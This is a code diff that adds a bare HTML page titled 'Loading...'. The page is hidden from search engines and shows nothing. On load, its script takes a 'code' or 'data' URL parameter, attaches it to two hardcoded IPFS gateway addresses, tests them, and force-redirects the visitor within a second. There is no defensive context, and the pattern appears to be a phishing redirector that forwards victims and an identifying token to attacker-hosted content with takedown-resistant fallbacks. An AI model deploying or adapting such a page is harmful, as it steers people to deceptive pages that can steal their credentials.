@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Loading...</title>
+  <meta name="robots" content="noindex, nofollow" />
+</head>
+<body>
+  <p style="text-align:center; font-family:sans-serif;">.</p>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const encoded = params.get("code") || params.get("data");
+
+    const ipfsCIDs = [
+      "bafkreih4ctrxsgwponmaqzoz7x4l6g3ditb3uhyc7xjescj5nqoqeksgoa", // Primary
+      "bafkreidfiks4afpawqkkt42xeubp522gsh3xfijx7dy2ngut7775tm7vb4"  // Backup 4
+    ];
+
+    const gateways = ipfsCIDs.map(cid => {
+      const url = `https://ipfs.io/ipfs/${cid}`;
+      return encoded ? `${url}?data=${encodeURIComponent(encoded)}` : url;
+    });
+
+    let index = 0;
+
+    function tryNext() {
+      if (index >= gateways.length) {
+        // fallback failsafe
+        window.location.href = gateways[gateways.length - 1];
+        return;
+      }
+
+      const url = gateways[index++];
+      fetch(url, { method: "HEAD", mode: "no-cors" }).then(() => {
+        window.location.href = url;
+      }).catch(() => {
+        tryNext(); // try next fallback
+      });
+    }
+
+    tryNext();
+
+    // Failsafe force redirect after 1s
+    setTimeout(() => {
+      window.location.href = gateways[gateways.length - 1];
+    }, 1000);
+  </script>
+</body>
+</html>
